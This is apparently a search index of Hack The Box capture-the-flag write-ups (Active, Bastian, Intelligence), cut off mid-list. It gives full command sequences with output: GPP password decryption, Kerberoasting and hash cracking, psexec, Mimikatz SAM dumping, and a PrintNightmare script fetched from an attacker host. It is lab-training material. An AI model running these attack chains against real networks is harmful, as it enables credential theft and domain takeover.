obtained Administrator password! Which is Ticketmaster1968 we can now login into the target machine with full privileges. HTB/Boxes \u2192 psexec.py administrator: 'Ticketmaster1968' @10.10.10.100 Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation [ * ] Requesting shares on 10 .10.10.100..... [ * ] Found writable share ADMIN$ [ * ] Uploading file eWhpxQSR.exe [ * ] Opening SVCManager on 10 .10.10.100..... [ * ] Creating service RfrB on 10 .10.10.100..... [ * ] Starting service RfrB..... [ ! ] Press help for extra shell commands Microsoft Windows [ Version 6 .1.7601 ] Copyright ( c ) 2009 Microsoft Corporation. All rights reserved. C: \\W indows \\s ystem32> Now we can grap user.txt and root.txt flags c: \\U sers>more svc_tgs \\d esktop \\u ser.txt 86d67d8ba232bb6a254aa4d10159e983 c: \\U sers>more administrator \\d esktop \\r oot.txt b5fc76d1d6b91d77b2fbf2d54d0f708b","title":"Active"},{"location":"Writeups/machines/active/writeup/#overview","text":"","title":"Overview"},{"location":"Writeups/machines/active/writeup/#walkthrough","text":"","title":"Walkthrough"},{"location":"Writeups/machines/active/writeup/#recon","text":"","title":"Recon"},{"location":"Writeups/machines/active/writeup/#nmap","text":"PORT STATE SERVICE REASON VERSION 53 /tcp open domain syn-ack Microsoft DNS 6 .1.7601 ( 1DB15D39 ) ( Windows Server 2008 R2 SP1 ) | dns-nsid: | _ bind.version: Microsoft DNS 6 .1.7601 ( 1DB15D39 ) 88 /tcp open kerberos-sec syn-ack Microsoft Windows Kerberos ( server time: 2021 -07-02 09 :48:09Z ) 135 /tcp open msrpc syn-ack Microsoft Windows RPC 139 /tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 389 /tcp open ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: active.htb, Site: Default-First-Site-Name ) 445 /tcp open microsoft-ds? syn-ack 464 /tcp open kpasswd5? syn-ack 593 /tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1 .0 636 /tcp open tcpwrapped syn-ack 3268 /tcp open ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: active.htb, Site: Default-First-Site-Name ) 3269 /tcp open tcpwrapped syn-ack 49152 /tcp open msrpc syn-ack Microsoft Windows RPC 49153 /tcp open msrpc syn-ack Microsoft Windows RPC 49154 /tcp open msrpc syn-ack Microsoft Windows RPC 49155 /tcp open msrpc syn-ack Microsoft Windows RPC 49157 /tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1 .0 49158 /tcp open msrpc syn-ack Microsoft Windows RPC By looking into nmap results, we can identify that the host is Domain Controller.","title":"nmap"},{"location":"Writeups/machines/active/writeup/#enumerating-open-shares","text":"\u039e ~/tmp \u2192 smbclient -L \\\\\\\\ 10 .10.10.100 -U '' -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk Found open folder Replication , lets dump it is content \u039e Active/dump \u2192 smbclient \\\\\\\\ 10 .10.10.100 \\\\ Replication -U '' -N Try \"help\" to get a list of possible commands. smb: \\> recurse on smb: \\> prompt off smb: \\> mget *","title":"Enumerating Open Shares"},{"location":"Writeups/machines/active/writeup/#gpp-stored-credentials","text":"The file contain AD Group Policy Preferences (GPP), lets search for any encrypted password. GPP Stored Credentials is old vulnerability which is currently patched, for further reading see the this link: https://adsecurity.org/?p=2288 Usually GPP encrypted passwords is stored in the variable cpassword we can use grep to search for cpassword variable: \u039e Active/dump \u2192 grep -iR \"cpassword\" active.htb/Policies/ { 31B2F340-016D-11D2-945F-00C04FB984F9 } /MACHINE/Preferences/Groups/Groups.xml:<Groups clsid = \"{3125E937-EB16-4b4c-9934-544FC6D24D26}\" ><User clsid = \"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name = \"active.htb\\SVC_TGS\" image = \"2\" changed = \"2018-07-18 20:46:06\" uid = \"{EF57DA28-5F69-4530-A59E-AAB58578219D}\" ><Properties action = \"U\" newName = \"\" fullName = \"\" description = \"\" cpassword = \"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon = \"0\" noChange = \"1\" neverExpires = \"1\" acctDisabled = \"0\" userName = \"active.htb\\SVC_TGS\" /></User> Found GPP encypted password for the user svc_tgs which is: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ Kali linux have built in tool that can decrypt GPP Encrypted password gpp-decrypt : \u039e OldBoxes/shocker \u2192 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ GPPstillStandingStrong2k18 svc_tgs user password is GPPstillStandingStrong2k18","title":"GPP Stored Credentials"},{"location":"Writeups/machines/active/writeup/#request-spn-service-account-tickets","text":"After obtain svc_tgs credentials lets use it to request SPN Service accounts tickets: \u039e Active/dump \u2192 GetUserSPNs.py -dc-ip 10 .10.10.100 active.htb/svc_tgs -request Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN = Group Policy Creator Owners,CN = Users,DC = active,DC = htb 2018 -07-18 15 :06:40.351723 2021 -01-21 11 :07:03.723783 $krb5tgs$23$* Administrator $ACTIVE .HTB $active .htb/Administrator* $b43bf8023365ea1108b5424b53c2a450$146 e01d19a37eca33003ca119ded7a074639abadba134eeed77439ba7679c5dda70afc803385e024a64b2fac83e29d1d75d81f0573aa0cce61870aee4eab395ca3b48146e75ade21025ef408446ad90763ef6e17cea403f82eacf20178fc78a3b6cc8694136a816c8aeac46fd23cf95729a287ea6c8232c554a7ce1f2244df1df6c8a34fcfac5199147f26249343a1f34f224716098568e7eb7c490760f1bc90100536274d89bba11e134c6df6b8d625d3805f9a60dfc1e47b15b038ba8c43fbf4d27249f92ac80fc8828d1a29b601c4d9271774239400b95c7fd530991ff5b37b5c26b192b0cfbea2af928adf902ea373ac9997e6f3379345c5f324fd4e8ab76c1dc98c71cc2e78d2e360dfa1196d7319f5ed40d3011372c91a6f0411dd56af96bc4b3af8bb29c68462313b56d2b86aa0b60448ad8b2a7f878c74621388ea0dcb7a0fe165eca97dbd549e2b2e34654cca5d6ce1d6d2c697ae41bd24d599d0f6ad74fd1f063c66ec6a87029baa4731d0be51f63a54d7bcdc7ba13f2e834c381fb1d46e7c6df8675dc85b6ccb328494635a2c2ee48cbc9d2c8514b8884d945f796cb4c468fa631c2e33253da49cd16cd46fc170e66435d5395080af0ebffb39e6d514524258accb383e7d5f65d4536255ee19d381ee1fea36e746eea0333f8126c4b22c9ff9d79c77d03abff93318e9277f75d81fcd93ea1c039706f41585d2383e0af51b3f990cc2a32608a482d564455c405324e9b2f678300ff1056cfecd5d242bc39451f885f1441a4a80334ce19104accd3bed6476ea454d053c2d386078960a66df55c4706b945612fa712c4d4a70cb07c2f3d5a648e9620be5fb049e73bbe30bfeecf48f1f483bb5bed90337f4e56d033a1a3fce605d05043f1d24c1f73213a2591fa538f9215dee625df91a9157f09a074259b96a1993d045a59ae97103f8f2395866f3829fde0a7eb6ea3708982770649321534fd29ebbb8072e8a1ed7494e5967aa2526e572746c02e9ccb61d1738923c00fe9ab846c47712d8d5b0c9e8a0298c96321a0b5fd2f9ef31433043f8d219f80cffb98e86ce024a4e7ad3e61632a081a86d93b0554ec4d69d776ca9f8f8386d13c23a0a35138e998ce6029ae963b9964b14289de3e554e96be23b6ceb3469d8ef76e0d98a9faf7b32a4a0387aee9c48072245d926db2641379f7a79f26440465fff1340a5e4f5cec32166e780cb452e2e53e4975b5aac913e93175aa7c7a3b53477339d7c We found Administrator ticket! Let's crack it using hashcat Active/dump \u2192 hashcat -a 0 -m 13100 admin-krb.txt /usr/share/wordlists/rockyou.txt --force hashcat ( v6.1.1 ) starting... ... $krb5tgs$23$* Administrator$... ....9d7c:Ticketmaster1968 Session..........: hashcat Status...........: Cracked .... Now obtained Administrator password! Which is Ticketmaster1968 we can now login into the target machine with full privileges. HTB/Boxes \u2192 psexec.py administrator: 'Ticketmaster1968' @10.10.10.100 Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation [ * ] Requesting shares on 10 .10.10.100..... [ * ] Found writable share ADMIN$ [ * ] Uploading file eWhpxQSR.exe [ * ] Opening SVCManager on 10 .10.10.100..... [ * ] Creating service RfrB on 10 .10.10.100..... [ * ] Starting service RfrB..... [ ! ] Press help for extra shell commands Microsoft Windows [ Version 6 .1.7601 ] Copyright ( c ) 2009 Microsoft Corporation. All rights reserved. C: \\W indows \\s ystem32> Now we can grap user.txt and root.txt flags c: \\U sers>more svc_tgs \\d esktop \\u ser.txt 86d67d8ba232bb6a254aa4d10159e983 c: \\U sers>more administrator \\d esktop \\r oot.txt b5fc76d1d6b91d77b2fbf2d54d0f708b","title":"Request SPN Service Account Tickets"},{"location":"Writeups/machines/bastian/writeup/","text":"Overview \u00b6 Walkthrough \u00b6 Recon \u00b6 nmap \u00b6 PORT STATE SERVICE REASON VERSION 22 /tcp open ssh syn-ack OpenSSH for_Windows_7.9 ( protocol 2 .0 ) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a ( RSA ) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3bG3TRRwV6dlU1lPbviOW+3fBC7wab+KSQ0Gyhvf9Z1OxFh9v5e6GP4rt5Ss76ic1oAJPIDvQwGlKdeUEnjtEtQXB/78Ptw6IPPPPwF5dI1W4GvoGR4MV5Q6CPpJ6HLIJdvAcn3isTCZgoJT69xRK0ymPnqUqaB+/ptC4xvHmW9ptHdYjDOFLlwxg17e7Sy0CA67PW/nXu7+OKaIOx0lLn8QPEcyrYVCWAqVcUsgNNAjR4h1G7tYLVg3SGrbSmIcxlhSMexIFIVfR37LFlNIYc6Pa58lj2MSQLusIzRoQxaXO4YSp/dM1tk7CN2cKx1PTd9VVSDH+/Nq0HCXPiYh3 | 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 ( ECDSA ) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Mau7cS9INLBOXVd4TXFX/02+0gYbMoFzIayeYeEOAcFQrAXa1nxhHjhfpHXWEj2u0Z/hfPBzOLBGi/ngFRUg = | 256 93 :5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 ( ED25519 ) | _ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB34X2ZgGpYNXYb+KLFENmf0P0iQ22Q0sjws2ATjFsiN 135 /tcp open msrpc syn-ack Microsoft Windows RPC 139 /tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 445 /tcp open microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012 ; CPE: cpe:/o:microsoft:windows Enumerating SMB Shares \u00b6 OldBoxes/bastian \u2192 smbclient -L \\\\\\\\ 10 .10.10.134 -U 'anonymouse' -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin Backups Disk C$ Disk Default share IPC$ IPC Remote IPC bastian/dump \u2192 smbclient \\\\\\\\ 10 .10.10.134 \\\\ backups -U 'anonymouse' -N Try \"help\" to get a list of possible commands. smb: \\> recurse on smb: \\> prompt off smb: \\> timeout 1000000 io_timeout per operation is now 1000000 smb: \\> mget * Enumerating Win Hard Disk \u00b6 Run Mimikatz inside VHD to found the user L4mpje NTLM hash: 26112010952d963c8dc4217daec986d9 mimikatz # lsadump::sam /system:SYSTEM /sam:SAM Domain : L4MPJE-PC SysKey : 8b56b2cb5033d8e2e289c26f8939a25f Local SID : S-1-5-21-18827714-3633218324-154007371 SAMKey : 335e6c10b1dce6433e9ef82d30f49d3a RID : 000001f4 ( 500 ) User : Administrator Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0 RID : 000001f5 ( 501 ) User : Guest RID : 000003e8 ( 1000 ) User : L4mpje Hash NTLM: 26112010952d963c8dc4217daec986d9 Then crack it using hashcat \u039e bastian/dump \u2192 hashcat -a 0 -m 1000 l4mpje-ntlm /usr/share/wordlists/rockyou.txt hashcat ( v6.1.1 ) starting... .... 26112010952d963c8dc4217daec986d9:bureaulampje Session..........: hashcat Status...........: Cracked Hash.Name........: NTLM Hash.Target......: 26112010952d963c8dc4217daec986d9 Then login into SSH bastian/dump \u2192 ssh L4mpje@10.10.10.134 The authenticity of host '10.10.10.134 (10.10.10.134)' can 't be established. ECDSA key fingerprint is SHA256:ILc1g9UC/7j/5b+vXeQ7TIaXLFddAbttU86ZeiM/bNY. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added ' 10 .10.10.134 ' (ECDSA) to the list of known hosts. L4mpje@10.10.10.134' s password: Microsoft Windows [ Version 10 .0.14393 ] ( c ) 2016 Microsoft Corporation. All rights reserved. l4mpje@BASTION C: \\U sers \\L 4mpje> l4mpje@BASTION C: \\U sers \\L 4mpje \\D esktop>more user.txt 9bfe57d5c3309db3a151772f9d86c6cd Privilege Escalation \u00b6 PrintNightmare (CVE 2021-1675) \u00b6 PS C :\\ Users \\ L4mpje \\ Videos > Invoke-WebRequest \"http://10.10.14.27:9001/CVE-2021-1675.ps1\" PS C :\\ Users \\ L4mpje \\ Videos > . .\\ CVE - 2021 - 1675 . ps1 PS C: \\U sers \\L 4mpje \\V ideos> Invoke-Nightmare [ + ] using default new user: adm1n [ + ] using default new password: P@ssw0rd [ + ] created payload at C: \\U sers \\L 4mpje \\A ppData \\L ocal \\T emp \\n ightmare.dll [ + ] using pDriverPath = \"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_1734185bdb8f8610\\Amd64\\mxdwdrv.dll\" [ + ] added user as local administrator [ + ] deleting payload from C: \\U sers \\L 4mpje \\A ppData \\L ocal \\T emp \\n ightmare.dll PS C: \\U sers \\L 4mpje \\V ideos> net users User accounts for \\\\ BASTION ------------------------------------------------------------------------------- adm1n Administrator DefaultAccount Guest L4mpje The command completed successfully. bastian/dump \u2192 ssh adm1n@10.10.10.134 adm1n@10.10.10.134 's password: dPermission denied, please try again. adm1n@10.10.10.134' s password: Microsoft Windows [ Version 10 .0.14393 ] ( c ) 2016 Microsoft Corporation. All rights reserved. adm1n@BASTION C: \\U sers \\A dministrator \\D esktop>more root.txt 958850b91811676ed6620a9c430e65c8","title":"Bastian"},{"location":"Writeups/machines/bastian/writeup/#overview","text":"","title":"Overview"},{"location":"Writeups/machines/bastian/writeup/#walkthrough","text":"","title":"Walkthrough"},{"location":"Writeups/machines/bastian/writeup/#recon","text":"","title":"Recon"},{"location":"Writeups/machines/bastian/writeup/#nmap","text":"PORT STATE SERVICE REASON VERSION 22 /tcp open ssh syn-ack OpenSSH for_Windows_7.9 ( protocol 2 .0 ) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a ( RSA ) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3bG3TRRwV6dlU1lPbviOW+3fBC7wab+KSQ0Gyhvf9Z1OxFh9v5e6GP4rt5Ss76ic1oAJPIDvQwGlKdeUEnjtEtQXB/78Ptw6IPPPPwF5dI1W4GvoGR4MV5Q6CPpJ6HLIJdvAcn3isTCZgoJT69xRK0ymPnqUqaB+/ptC4xvHmW9ptHdYjDOFLlwxg17e7Sy0CA67PW/nXu7+OKaIOx0lLn8QPEcyrYVCWAqVcUsgNNAjR4h1G7tYLVg3SGrbSmIcxlhSMexIFIVfR37LFlNIYc6Pa58lj2MSQLusIzRoQxaXO4YSp/dM1tk7CN2cKx1PTd9VVSDH+/Nq0HCXPiYh3 | 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 ( ECDSA ) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Mau7cS9INLBOXVd4TXFX/02+0gYbMoFzIayeYeEOAcFQrAXa1nxhHjhfpHXWEj2u0Z/hfPBzOLBGi/ngFRUg = | 256 93 :5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 ( ED25519 ) | _ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB34X2ZgGpYNXYb+KLFENmf0P0iQ22Q0sjws2ATjFsiN 135 /tcp open msrpc syn-ack Microsoft Windows RPC 139 /tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 445 /tcp open microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012 ; CPE: cpe:/o:microsoft:windows","title":"nmap"},{"location":"Writeups/machines/bastian/writeup/#enumerating-smb-shares","text":"OldBoxes/bastian \u2192 smbclient -L \\\\\\\\ 10 .10.10.134 -U 'anonymouse' -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin Backups Disk C$ Disk Default share IPC$ IPC Remote IPC bastian/dump \u2192 smbclient \\\\\\\\ 10 .10.10.134 \\\\ backups -U 'anonymouse' -N Try \"help\" to get a list of possible commands. smb: \\> recurse on smb: \\> prompt off smb: \\> timeout 1000000 io_timeout per operation is now 1000000 smb: \\> mget *","title":"Enumerating SMB Shares"},{"location":"Writeups/machines/bastian/writeup/#enumerating-win-hard-disk","text":"Run Mimikatz inside VHD to found the user L4mpje NTLM hash: 26112010952d963c8dc4217daec986d9 mimikatz # lsadump::sam /system:SYSTEM /sam:SAM Domain : L4MPJE-PC SysKey : 8b56b2cb5033d8e2e289c26f8939a25f Local SID : S-1-5-21-18827714-3633218324-154007371 SAMKey : 335e6c10b1dce6433e9ef82d30f49d3a RID : 000001f4 ( 500 ) User : Administrator Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0 RID : 000001f5 ( 501 ) User : Guest RID : 000003e8 ( 1000 ) User : L4mpje Hash NTLM: 26112010952d963c8dc4217daec986d9 Then crack it using hashcat \u039e bastian/dump \u2192 hashcat -a 0 -m 1000 l4mpje-ntlm /usr/share/wordlists/rockyou.txt hashcat ( v6.1.1 ) starting... .... 26112010952d963c8dc4217daec986d9:bureaulampje Session..........: hashcat Status...........: Cracked Hash.Name........: NTLM Hash.Target......: 26112010952d963c8dc4217daec986d9 Then login into SSH bastian/dump \u2192 ssh L4mpje@10.10.10.134 The authenticity of host '10.10.10.134 (10.10.10.134)' can 't be established. ECDSA key fingerprint is SHA256:ILc1g9UC/7j/5b+vXeQ7TIaXLFddAbttU86ZeiM/bNY. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added ' 10 .10.10.134 ' (ECDSA) to the list of known hosts. L4mpje@10.10.10.134' s password: Microsoft Windows [ Version 10 .0.14393 ] ( c ) 2016 Microsoft Corporation. All rights reserved. l4mpje@BASTION C: \\U sers \\L 4mpje> l4mpje@BASTION C: \\U sers \\L 4mpje \\D esktop>more user.txt 9bfe57d5c3309db3a151772f9d86c6cd","title":"Enumerating Win Hard Disk"},{"location":"Writeups/machines/bastian/writeup/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"Writeups/machines/bastian/writeup/#printnightmare-cve-2021-1675","text":"PS C :\\ Users \\ L4mpje \\ Videos > Invoke-WebRequest \"http://10.10.14.27:9001/CVE-2021-1675.ps1\" PS C :\\ Users \\ L4mpje \\ Videos > . .\\ CVE - 2021 - 1675 . ps1 PS C: \\U sers \\L 4mpje \\V ideos> Invoke-Nightmare [ + ] using default new user: adm1n [ + ] using default new password: P@ssw0rd [ + ] created payload at C: \\U sers \\L 4mpje \\A ppData \\L ocal \\T emp \\n ightmare.dll [ + ] using pDriverPath = \"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_1734185bdb8f8610\\Amd64\\mxdwdrv.dll\" [ + ] added user as local administrator [ + ] deleting payload from C: \\U sers \\L 4mpje \\A ppData \\L ocal \\T emp \\n ightmare.dll PS C: \\U sers \\L 4mpje \\V ideos> net users User accounts for \\\\ BASTION ------------------------------------------------------------------------------- adm1n Administrator DefaultAccount Guest L4mpje The command completed successfully. bastian/dump \u2192 ssh adm1n@10.10.10.134 adm1n@10.10.10.134 's password: dPermission denied, please try again. adm1n@10.10.10.134' s password: Microsoft Windows [ Version 10 .0.14393 ] ( c ) 2016 Microsoft Corporation. All rights reserved. adm1n@BASTION C: \\U sers \\A dministrator \\D esktop>more root.txt 958850b91811676ed6620a9c430e65c8","title":"PrintNightmare (CVE 2021-1675)"},{"location":"Writeups/machines/intelligence/Intelligence/","text":"Overview \u00b6 Intelligence was my best HTB Machine yet, where it was realist environment and real life scenario. Intelligence was based in Active Directory Penetration Test and mostly depeneds in enumeration to found a way into the Domain Admin. My HTB profile link Machine Info \u00b6 Operating System Difficulty IP Windows Medium 10.10.10.248 Walkthrough \u00b6 Recon \u00b6 nmap \u00b6 PORT STATE SERVICE REASON VERSION 53 /tcp open domain syn-ack Simple DNS Plus 80 /tcp open http syn-ack Microsoft IIS httpd 10 .0 | _http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST | _ Potentially risky methods: TRACE | _http-server-header: Microsoft-IIS/10.0 | _http-title: Intelligence 88 /tcp open kerberos-sec syn-ack Microsoft Windows Kerberos ( server time: 2021 -07-04 20 :46:20Z ) 135 /tcp open msrpc syn-ack Microsoft Windows RPC 139 /tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 389 /tcp open ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: intelligence.htb0., Site: Default-First-Site-Name ) | ssl-cert: Subject: commonName = dc.intelligence.htb | Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb | Issuer: commonName = intelligence-DC-CA/domainComponent = intelligence 445 /tcp open microsoft-ds? syn-ack 464 /tcp open kpasswd5? syn-ack 593 /tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1 .0 636 /tcp open ssl/ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: intelligence.htb0., Site: Default-First-Site-Name ) | ssl-cert: Subject: commonName = dc.intelligence.htb | Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb | Issuer: commonName = intelligence-DC-CA/domainComponent = intelligence 3268 /tcp open ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: intelligence.htb0., Site: Default-First-Site-Name ) | ssl-cert: Subject: commonName = dc.intelligence.htb | Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb | Issuer: commonName = intelligence-DC-CA/domainComponent = intelligence 3269 /tcp open ssl/ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: intelligence.htb0., Site: Default-First-Site-Name ) | ssl-cert: Subject: commonName = dc.intelligence.htb | Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb Service Info: Host: DC ; OS: Windows ; CPE: cpe:/o:microsoft:windows By looking into nmap scanning results, we will discover that the host is Domain Controller. Furthermore, port 80, 139, 445 are opened so we can enumerate web service and SMB shared folders. Web Enumeration \u00b6 During inspecting the web application, we will identify a new directory /documents that contains multiple PDF files. Two documents can be identify if we hover over download button: http://10.10.10.248/documents/2020-01-01-upload.pdf and http://10.10.10.248/documents/2020-12-15-upload.pdf After downloading the PDF documents, I used exiftool to check the creator of document in order to enumerate domain users. From the pattern of the PDF files name I identified that the naming format is using 2020-##-##-upload.pdf where is ## is two digits. Fuzzing Documents \u00b6 Collecting Domain Users With the knowledge of this, made a list of 4 digits to run wfuzz in order to find valid PDF documents. I used the following command to create a sequence of 4 digits and insert - in the middle: seq -w 0000 9999 | sed 's/../&-/' > nums Then, I run wfuzz to fuzz target URL with my created list of 4 digits: wfuzz -c -z file,nums -f output.json,json --sc 200 http://10.10.10.248/documents/2020-FUZZ-upload.pdf After that, collected all valid documents and I made a Python script to auto download the valid documents: import requests from multiprocessing.pool import ThreadPool def download_url ( url ): print ( \"downloading: \" , url ) file_name_start_pos = url . rfind ( \"/\" ) + 1 file_name = url [ file_name_start_pos :] r = requests . get ( url , stream = True ) if r . status_code == requests . codes . ok : with open ( file_name , 'wb' ) as f : for data in r : f . write ( data ) return url urls = [ \"http://10.10.10.248/documents/2020-01-04-upload.pdf\" , \"http://10.10.10.248/documents/2020-01-02-upload.pdf\" , \"http://10.10.10.248/documents/2020-01-01-upload.pdf\" , \"http://10.10.10.248/documents/2020-01-10-upload.pdf\" , \"http://10.10.10.248/documents/2020-01-22-upload.pdf\" , \"http://10.10.10.248/documents/2020-01-30-upload.pdf\" , \"http://10.10.10.248/documents/2020-01-25-upload.pdf\" , \"http://10.10.10.248/documents/2020-01-23-upload.pdf\" , \"http://10.10.10.248/documents/2020-01-20-upload.pdf\" , \"http://10.10.10.248/documents/2020-02-11-upload.pdf\" , \"http://10.10.10.248/documents/2020-02-28-upload.pdf\" , \"http://10.10.10.248/documents/2020-02-24-upload.pdf\" , \"http://10.10.10.248/documents/2020-02-23-upload.pdf\" , \"http://10.10.10.248/documents/2020-02-17-upload.pdf\" , \"http://10.10.10.248/documents/2020-03-04-upload.pdf\" , \"http://10.10.10.248/documents/2020-03-05-upload.pdf\" , \"http://10.10.10.248/documents/2020-03-12-upload.pdf\" , \"http://10.10.10.248/documents/2020-03-21-upload.pdf\" , \"http://10.10.10.248/documents/2020-03-17-upload.pdf\" , \"http://10.10.10.248/documents/2020-03-13-upload.pdf\" , \"http://10.10.10.248/documents/2020-04-04-upload.pdf\" , \"http://10.10.10.248/documents/2020-04-02-upload.pdf\" , \"http://10.10.10.248/documents/2020-04-23-upload.pdf\" , \"http://10.10.10.248/documents/2020-04-15-upload.pdf\" , \"http://10.10.10.248/documents/2020-05-07-upload.pdf\" , \"http://10.10.10.248/documents/2020-05-03-upload.pdf\" , \"http://10.10.10.248/documents/2020-05-01-upload.pdf\" , \"http://10.10.10.248/documents/2020-05-24-upload.pdf\" , \"http://10.10.10.248/documents/2020-05-29-upload.pdf\" , \"http://10.10.10.248/documents/2020-05-21-upload.pdf\" , \"http://10.10.10.248/documents/2020-05-20-upload.pdf\" , \"http://10.10.10.248/documents/2020-05-17-upload.pdf\" , \"http://10.10.10.248/documents/2020-05-11-upload.pdf\" , \"http://10.10.10.248/documents/2020-06-21-upload.pdf\" , \"http://10.10.10.248/documents/2020-06-30-upload.pdf\" , \"http://10.10.10.248/documents/2020-06-28-upload.pdf\" , \"http://10.10.10.248/documents/2020-06-25-upload.pdf\" , \"http://10.10.10.248/documents/2020-06-26-upload.pdf\" , \"http://10.10.10.248/documents/2020-06-22-upload.pdf\" , \"http://10.10.10.248/documents/2020-06-15-upload.pdf\" , \"http://10.10.10.248/documents/2020-06-14-upload.pdf\" , \"http://10.10.10.248/documents/2020-06-12-upload.pdf\" , \"http://10.10.10.248/documents/2020-06-08-upload.pdf\" , \"http://10.10.10.248/documents/2020-06-04-upload.pdf\" , \"http://10.10.10.248/documents/2020-06-07-upload.pdf\" , \"http://10.10.10.248/documents/2020-06-03-upload.pdf\" , \"http://10.10.10.248/documents/2020-06-02-upload.pdf\" , \"http://10.10.10.248/documents/2020-07-08-upload.pdf\" , \"http://10.10.10.248/documents/2020-07-06-upload.pdf\" , \"http://10.10.10.248/documents/2020-07-02-upload.pdf\" , \"http://10.10.10.248/documents/2020-07-24-upload.pdf\" , \"http://10.10.10.248/documents/2020-07-20-upload.pdf\" , \"http://10.10.10.248/documents/2020-08-20-upload.pdf\" , \"http://10.10.10.248/documents/2020-08-19-upload.pdf\" , \"http://10.10.10.248/documents/2020-08-09-upload.pdf\" , \"http://10.10.10.248/documents/2020-08-01-upload.pdf\" , \"http://10.10.10.248/documents/2020-08-03-upload.pdf\" , \"http://10.10.10.248/documents/2020-09-05-upload.pdf\" , \"http://10.10.10.248/documents/2020-09-04-upload.pdf\" , \"http://10.10.10.248/documents/2020-09-02-upload.pdf\" , \"http://10.10.10.248/documents/2020-09-06-upload.pdf\" , \"http://10.10.10.248/documents/2020-09-29-upload.pdf\" , \"http://10.10.10.248/documents/2020-09-27-upload.pdf\" , \"http://10.10.10.248/documents/2020-09-22-upload.pdf\" , \"http://10.10.10.248/documents/2020-09-16-upload.pdf\" , \"http://10.10.10.248/documents/2020-09-11-upload.pdf\" , \"http://10.10.10.248/documents/2020-09-13-upload.pdf\" , \"http://10.10.10.248/documents/2020-09-30-upload.pdf\" , \"http://10.10.10.248/documents/2020-10-05-upload.pdf\" , \"http://10.10.10.248/documents/2020-10-19-upload.pdf\" , \"http://10.10.10.248/documents/2020-11-10-upload.pdf\" , \"http://10.10.10.248/documents/2020-11-06-upload.pdf\" , \"http://10.10.10.248/documents/2020-11-03-upload.pdf\" , \"http://10.10.10.248/documents/2020-11-01-upload.pdf\" , \"http://10.10.10.248/documents/2020-11-13-upload.pdf\" , \"http://10.10.10.248/documents/2020-11-11-upload.pdf\" , \"http://10.10.10.248/documents/2020-11-30-upload.pdf\" , \"http://10.10.10.248/documents/2020-11-24-upload.pdf\" , \"http://10.10.10.248/documents/2020-12-15-upload.pdf\" , \"http://10.10.10.248/documents/2020-12-10-upload.pdf\" , \"http://10.10.10.248/documents/2020-12-30-upload.pdf\" , \"http://10.10.10.248/documents/2020-12-28-upload.pdf\" , 